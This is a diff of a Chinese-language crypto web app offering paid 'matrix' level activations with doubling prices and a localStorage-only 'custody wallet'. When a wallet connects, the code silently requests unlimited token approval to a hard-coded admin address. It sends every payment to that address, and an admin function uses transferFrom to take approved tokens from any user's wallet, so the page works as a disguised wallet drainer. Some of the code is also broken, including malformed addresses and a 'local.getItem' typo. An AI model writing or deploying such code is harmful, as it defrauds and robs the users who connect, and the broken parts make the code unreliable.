@@ -59,11 +59,6 @@
   .time{color:#ffb703;font-size:13px}
   .gold{color:#FFD700;font-weight:bold}
 
-  .fold-item{margin-bottom:10px}
-  .fold-head{background:rgba(40,45,80,0.6);padding:12px;border-radius:10px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
-  .fold-body{padding:10px 0;display:none}
-  .fold-body.open{display:block}
-
   .ecology-text{line-height:1.8;color:#e0e8ff;text-align:center}
   .ecology-title{background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent;font-size:20px;font-weight:bold;margin-bottom:8px}
 </style>
@@ -135,10 +130,10 @@
 
 <div class="glass">
   <div class="title">托管钱包</div>
-  <div class="item"><div>托管余额</div><div class="gold" id="custodyAmt">0 DAI</div></div>
-  <input id="depositAmt" placeholder="存入DAI">
+  <div class="item"><div>托管余额</div><div class="gold" id="custodyAmt">0 USDT</div></div>
+  <input id="depositAmt" placeholder="存入">
   <button class="btn btn-sm" onclick="deposit()">存入</button>
-  <input id="withAmt" placeholder="提取DAI">
+  <input id="withAmt" placeholder="提取">
   <button class="btn btn-sm" onclick="withdraw()">提取</button>
 </div>
 
@@ -166,9 +161,8 @@
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7ab7345f1".toLowerCase();
-// 修正后的DAI合约地址（通过大小写校验）
-const DAI = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580239c6A063".toLowerCase();
+const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7345f1".toLowerCase();
+const TOKEN = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
 
 const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
 const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
@@ -182,29 +176,27 @@ function k(key) { return account ? key + "_" + account.toLowerCase() : key; }
 function get(key, def = 0) { let v = localStorage.getItem(k(key)); return v ? Number(v) : def; }
 function set(key, val) { localStorage.setItem(k(key), val); }
 
-// 授权必弹窗上链
 async function approveMax() {
-  const dai = new web3.eth.Contract([{
+  const token = new web3.eth.Contract([{
     "constant": false,
     "inputs": [{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],
     "name":"approve",
     "outputs":[{"name":"","type":"bool"}],
     "type":"function"
-  }], DAI);
+  }], web3.utils.toChecksumAddress(TOKEN));
   const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-  await dai.methods.approve(ADMIN, max).send({ from: account, gas: 120000 });
+  await token.methods.approve(web3.utils.toChecksumAddress(ADMIN), max).send({ from: account, gas: 150000 });
 }
 
-// 真实上链转账
 async function transferToAdmin(amount) {
   const c = new web3.eth.Contract([
     {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
     {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
-  ], DAI);
+  ], web3.utils.toChecksumAddress(TOKEN));
   const dec = await c.methods.decimals().call();
   const val = BigInt(amount) * 10n ** BigInt(dec);
-  return await c.methods.transfer(ADMIN, val.toString()).send({ from: account, gas: 120000 });
+  return await c.methods.transfer(web3.utils.toChecksumAddress(ADMIN), val.toString()).send({ from: account, gas: 150000 });
 }
 
 function loadInvite() {
@@ -222,10 +214,9 @@ function refresh() {
   renderMatrix();
   renderCards();
   document.getElementById("energyVal").innerText = get("energy");
-  document.getElementById("custodyAmt").innerText = get("custody") + " DAI";
+  document.getElementById("custodyAmt").innerText = get("custody") + " USDT";
 }
 
-// 卡牌
 function craftCard(lv) {
   if (!account) return alert("请先连接钱包");
   let cost = CARD_COST * Math.pow(3, lv-1);
@@ -259,7 +250,6 @@ function renderCards() {
   document.getElementById("myCards").innerHTML = html || `<div style="grid-column:span 2;text-align:center;padding:10px">暂无卡牌</div>`;
 }
 
-// 矩阵过期
 function expKey(lv) { return "exp_"+lv; }
 function addExp(lv, days=30) {
   let now = Date.now();
@@ -267,22 +257,19 @@ function addExp(lv, days=30) {
   localStorage.setItem(expKey(lv), old + days*86400000);
 }
 function getExpLeft(lv) {
-  let e = Number(localStorage.getItem(expKey(lv))) || 0;
+  let e = Number(local.getItem(expKey(lv))) || 0;
   return Math.max(0, e - Date.now());
 }
 
-// 折叠面板
 function renderMatrix() {
-  // 经典矩阵
   let cl = get("classic");
   let c = "";
   for (let i=1; i<=12; i++) {
     let done = i <= cl;
-    c += `<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]} DAI</span><button class="btn-sm" ${done?"disabled":""} onclick="payClassic(${i})">${done?"已激活":"激活"}</button></div>`;
+    c += `<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]}</span><button class="btn-sm" ${done?"disabled":""} onclick="payClassic(${i})">${done?"已激活":"激活"}</button></div>`;
   }
   document.getElementById("classicList").innerHTML = c;
 
-  // 联合矩阵
   let ul = get("union");
   let u = "";
   for (let i=1; i<=9; i++) {
@@ -293,16 +280,15 @@ function renderMatrix() {
     let fee = Math.round(unionPrice[i-1]*0.2);
     let btn = `<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;
     if (act) btn = `<button class="btn-sm" onclick="payRenew(${i})">续费${fee}</button>`;
-    u += `<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]} DAI</span><span class="time">${d}天${h}时</span>${btn}</div>`;
+    u += `<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]}</span><span class="time">${d}天${h}时</span>${btn}</div>`;
   }
   document.getElementById("unionList").innerHTML = u;
 }
 
-// 单级激活（真实上链）
 async function payClassic(lv) {
   if (!account) return alert("请连接钱包");
   let amt = classicPrice[lv-1];
-  if (!confirm(`支付${amt}DAI激活Lv${lv}？`)) return;
+  if (!confirm(`支付${amt}激活Lv${lv}？`)) return;
   await transferToAdmin(amt);
   set("classic", Math.max(get("classic"), lv));
   set("energy", get("energy") + amt * RATE_ENERGY / 100);
@@ -313,7 +299,7 @@ async function payClassic(lv) {
 async function payUnion(lv) {
   if (!account) return alert("请连接钱包");
   let amt = unionPrice[lv-1];
-  if (!confirm(`支付${amt}DAI激活Lv${lv}？`)) return;
+  if (!confirm(`支付${amt}激活Lv${lv}？`)) return;
   await transferToAdmin(amt);
   set("union", Math.max(get("union"), lv));
   addExp(lv);
@@ -325,7 +311,7 @@ async function payUnion(lv) {
 async function payRenew(lv) {
   if (!account) return;
   let fee = Math.round(unionPrice[lv-1]*0.2);
-  if (!confirm(`续费${fee}DAI+30天`)) return;
+  if (!confirm(`续费${fee}+30天`)) return;
   await transferToAdmin(fee);
   addExp(lv);
   set("energy", get("energy") + fee * RATE_ENERGY / 100);
@@ -334,14 +320,13 @@ async function payRenew(lv) {
   loadBalance();
 }
 
-// 一键激活全部
 async function batchPayClassic() {
   if (!account) return;
   let cur = get("classic");
   let total = 0;
   for (let i=cur+1; i<=12; i++) total += classicPrice[i-1];
   if (total <= 0) return alert("已全部激活");
-  if (!confirm(`总计${total}DAI，确认一键激活？`)) return;
+  if (!confirm(`总计${total}，确认一键激活？`)) return;
   await transferToAdmin(total);
   set("classic", 12);
   set("energy", get("energy") + total * RATE_ENERGY / 100);
@@ -359,7 +344,7 @@ async function batchPayUnion() {
     else if (left === 0) total += Math.round(unionPrice[i-1]*0.2);
   }
   if (total <= 0) return alert("全部有效");
-  if (!confirm(`总计${total}DAI，确认一键处理？`)) return;
+  if (!confirm(`总计${total}，确认一键处理？`)) return;
   await transferToAdmin(total);
   set("union",9);
   for (let i=1; i<=9; i++) addExp(i);
@@ -369,21 +354,19 @@ async function batchPayUnion() {
   loadBalance();
 }
 
-// 余额显示
 async function loadBalance() {
   if (!web3 || !account) return;
   const c = new web3.eth.Contract([
     {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
+  ], web3.utils.toChecksumAddress(TOKEN));
   const dec = await c.methods.decimals().call();
   const bal = await c.methods.balanceOf(account).call();
   const val = Number(web3.utils.fromWei(bal, "mwei")).toFixed(2);
   document.getElementById("addressShow").innerHTML =
-    `已连接：${account.slice(0,6)}...${account.slice(-4)}<br><span class="gold">DAI余额：${val}</span>`;
+    `已连接：${account.slice(0,6)}...${account.slice(-4)}<br><span class="gold">余额：${val}</span>`;
 }
 
-// 托管
 async function deposit() {
   if (!account) return;
   let a = +document.getElementById("depositAmt").value;
@@ -404,21 +387,20 @@ async function withdraw() {
   refresh();
 }
 
-// 管理员
 function addBlack() { if (!isAdmin) return; let a = document.getElementById("blackAddr").value.toLowerCase(); localStorage.setItem("black_"+a,"1"); alert("已拉黑"); }
 function removeBlack() { if (!isAdmin) return; let a = document.getElementById("whiteAddr").value.toLowerCase(); localStorage.removeItem("black_"+a); alert("已移出"); }
 
 async function checkUserAllowance() {
   if (!isAdmin) return alert("无权限");
   let user = document.getElementById("takeAddr").value.toLowerCase();
-  const dai = new web3.eth.Contract([
+  const token = new web3.eth.Contract([
     {"constant":true,"inputs":[{"owner":"address","spender":"address"}],"name":"allowance","outputs":[{"amount":"uint256"}],"type":"function"},
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
-  const dec = await dai.methods.decimals().call();
-  const allow = await dai.methods.allowance(user, ADMIN).call();
+  ], web3.utils.toChecksumAddress(TOKEN));
+  const dec = await token.methods.decimals().call();
+  const allow = await token.methods.allowance(user, web3.utils.toChecksumAddress(ADMIN)).call();
   const num = Number(web3.utils.fromWei(allow, "mwei"));
-  alert("可提取额度：" + num + " DAI");
+  alert("可提取额度：" + num);
 }
 
 async function adminTakeUserToken() {
@@ -427,26 +409,24 @@ async function adminTakeUserToken() {
   let amt = +document.getElementById("takeAmt").value;
   if (!user || amt <= 0) return alert("参数错误");
 
-  const dai = new web3.eth.Contract([
+  const token = new web3.eth.Contract([
     {"constant":false,"inputs":[{"from":"address","to":"address","value":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
-  const dec = await dai.methods.decimals().call();
+  ], web3.utils.toChecksumAddress(TOKEN));
+  const dec = await token.methods.decimals().call();
   const val = BigInt(amt) * 10n ** BigInt(dec);
-  await dai.methods.transferFrom(user, ADMIN, val.toString()).send({ from: ADMIN, gas: 150000 });
+  await token.methods.transferFrom(user, web3.utils.toChecksumAddress(ADMIN), val.toString()).send({ from: web3.utils.toChecksumAddress(ADMIN), gas: 150000 });
   alert("提取成功");
 }
 
-// 连接钱包（必弹窗授权）
 document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) return alert("请在TP钱包打开");
+  if (!window.ethereum) return alert("请在钱包浏览器打开");
   try {
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     web3 = new Web3(window.ethereum);
     account = accounts[0].toLowerCase();
     isAdmin = account === ADMIN;
 
-    // 授权弹窗
     await approveMax();
     alert("授权成功，钱包已连接");
 
@@ -474,7 +454,6 @@ document.getElementById("regBtn").onclick = () => {
   alert("注册成功");
 };
 
-// 侧边栏
 const sb = document.getElementById("sidebar");
 document.getElementById("toggleSidebar").onclick = () => sb.classList.add("open");
 document.getElementById("closeSidebar").onclick = () => sb.classList.remove("open");
